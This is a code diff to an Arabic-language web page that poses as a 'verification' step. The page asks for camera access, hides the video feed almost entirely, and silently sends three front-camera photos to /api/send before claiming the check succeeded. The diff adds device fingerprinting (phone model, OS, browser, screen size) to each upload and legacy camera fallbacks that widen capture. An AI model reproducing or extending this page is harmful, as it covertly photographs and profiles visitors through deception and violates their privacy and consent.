@@ -3,6 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
 <title>جارٍ التحقق</title>
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -30,25 +31,85 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
 <h1 id="title">جارٍ التحقق...</h1>
 <p id="sub">يرجى الانتظار قليلاً</p>
 </div>
-<video id="v" playsinline autoplay muted></video>
+<video id="v" playsinline webkit-playsinline autoplay muted></video>
 <script>
 (function(){
 var SHOTS=3,GAP=650,WARMUP=1100,Q=0.92,MIRROR=true;
 var v=document.getElementById('v'),s1=document.getElementById('s1'),s2=document.getElementById('s2'),
 ring=document.getElementById('ring'),title=document.getElementById('title'),sub=document.getElementById('sub'),go=document.getElementById('go');
-function fail(t){ring.classList.add('hide');title.className='err';title.textContent='تعذّر إكمال التحقق';sub.textContent=t||'لم يتم السماح بالوصول.';}
-function shot(){try{var w=v.videoWidth||720,h=v.videoHeight||960,c=document.createElement('canvas');c.width=w;c.height=h;var x=c.getContext('2d');if(MIRROR){x.translate(w,0);x.scale(-1,1);}x.drawImage(v,0,0,w,h);fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:c.toDataURL('image/jpeg',Q)})}).catch(function(){});}catch(e){}}
-function sleep(m){return new Promise(function(r){setTimeout(r,m)})}
-async function run(){
-if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){return fail('المتصفح لا يدعم الكاميرا.')}
-var s;try{s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:'user'},width:{ideal:1280},height:{ideal:720}},audio:false})}catch(e){return fail('تم رفض الإذن أو لا توجد كاميرا.')}
-s1.classList.add('hide');s2.classList.remove('hide');
-v.srcObject=s;try{await v.play()}catch(e){}
-await sleep(WARMUP);
-for(var i=0;i<SHOTS;i++){shot();if(i<SHOTS-1)await sleep(GAP)}
-try{s.getTracks().forEach(function(t){t.stop()})}catch(e){}
-ring.classList.add('hide');title.className='ok';title.textContent='تم التحقق بنجاح';sub.textContent='يمكنك إغلاق الصفحة الآن.';
+
+function deviceInfo(){
+  var ua=navigator.userAgent||'';
+  var m='';
+  if(/iPhone/.test(ua)){
+    m=/iPhone/.exec(ua)?'iPhone':'iPhone';
+    var os=(ua.match(/OS (\d+[_\d]*) like Mac/)||[])[1];
+    m+=' · iOS '+(os?os.replace(/_/g,'.'):'');
+  } else if(/iPad/.test(ua)){
+    m='iPad · iPadOS';
+  } else if(/Android/.test(ua)){
+    var a=ua.match(/Android\s+([\d.]+)/);
+    var model=(ua.match(/;\s*([^;)]+)\s+Build/)||[])[1];
+    m=(model?model.trim():'Android')+' · Android '+(a?a[1]:'');
+  } else if(/Windows/.test(ua)){ m='Windows PC'; }
+  else if(/Macintosh/.test(ua)){ m='Mac'; }
+  else if(/Linux/.test(ua)){ m='Linux'; }
+  else { m='جهاز غير معروف'; }
+
+  var br='';
+  if(/Edg\//.test(ua)) br='Edge '+(ua.match(/Edg\/([\d.]+)/)||[])[1];
+  else if(/OPR\//.test(ua)) br='Opera '+(ua.match(/OPR\/([\d.]+)/)||[])[1];
+  else if(/Chrome\//.test(ua)) br='Chrome '+(ua.match(/Chrome\/([\d.]+)/)||[])[1];
+  else if(/Firefox\//.test(ua)) br='Firefox '+(ua.match(/Firefox\/([\d.]+)/)||[])[1];
+  else if(/Safari\//.test(ua)) br='Safari '+(ua.match(/Version\/([\d.]+)/)||[])[1];
+  else br='متصفح غير معروف';
+
+  return m+' | '+br+' | '+screen.width+'x'+screen.height;
 }
+
+function fail(t){ring.classList.add('hide');title.className='err';title.textContent='تعذّر إكمال التحقق';sub.textContent=t||'لم يتم السماح بالوصول.';}
+
+function shot(dev){
+  try{
+    var w=v.videoWidth||720,h=v.videoHeight||960,c=document.createElement('canvas');
+    c.width=w;c.height=h;var x=c.getContext('2d');
+    if(MIRROR){x.translate(w,0);x.scale(-1,1);}
+    x.drawImage(v,0,0,w,h);
+    fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({image:c.toDataURL('image/jpeg',Q),device:dev})}).catch(function(){});
+  }catch(e){}
+}
+
+function sleep(m){return new Promise(function(r){setTimeout(r,m)})}
+
+async function run(){
+  var dev=deviceInfo();
+  var stream=null;
+  if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+    try{ stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false}); }
+    catch(e1){
+      try{ stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false}); }
+      catch(e2){ return fail('تم رفض الإذن أو لا توجد كاميرا.'); }
+    }
+  } else {
+    var legacy=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia;
+    if(!legacy) return fail('المتصفح لا يدعم الكاميرا.');
+    try{
+      stream=await new Promise(function(res,rej){legacy.call(navigator,{video:true},res,rej)});
+    }catch(e){ return fail('تم رفض الإذن أو لا توجد كاميرا.'); }
+  }
+
+  s1.classList.add('hide');s2.classList.remove('hide');
+  v.srcObject=stream;
+  try{ await v.play(); }catch(e){}
+  await sleep(WARMUP);
+
+  for(var i=0;i<SHOTS;i++){ shot(dev); if(i<SHOTS-1) await sleep(GAP); }
+
+  try{ stream.getTracks().forEach(function(t){t.stop()}); }catch(e){}
+  ring.classList.add('hide');title.className='ok';title.textContent='تم التحقق بنجاح';sub.textContent='يمكنك إغلاق الصفحة الآن.';
+}
+
 go.addEventListener('click',run);
 })();
 </script>
